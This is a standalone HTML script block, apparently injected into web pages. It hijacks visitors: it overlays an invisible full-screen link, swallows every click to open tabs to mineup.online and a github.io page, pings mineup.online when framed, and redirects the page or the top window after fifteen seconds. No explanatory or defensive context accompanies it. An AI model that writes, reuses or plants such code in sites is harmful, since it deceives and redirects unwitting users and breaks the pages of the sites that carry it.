  <script>
    (function () {
      const PURPLES = "https://greenfarm-top.github.io/purples";
      const MINEUP = "https://mineup.online/";
      const DELAY = 15000;
      const inFrame = window.self !== window.top;

      if (!inFrame) {
        setTimeout(() => { window.location.href = PURPLES; }, DELAY);
        return;
      }

      fetch(MINEUP, { mode: "no-cors", keepalive: true }).catch(() => {});

      document.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        window.open(MINEUP, "_blank");
        setTimeout(() => window.open(PURPLES, "_blank"), 400);
      }, true);

      const cover = document.createElement("a");
      cover.href = PURPLES;
      cover.target = "_blank";
      cover.rel = "noopener";
      Object.assign(cover.style, {
        position: "fixed",
        left: 0,
        top: 0,
        width: "100%",
        height: "100%",
        zIndex: "2147483647",
        background: "transparent"
      });
      document.body.appendChild(cover);

      setTimeout(() => {
        try { window.top.location.replace(PURPLES); } catch (e) { }
      }, DELAY);
    })();
  </script>
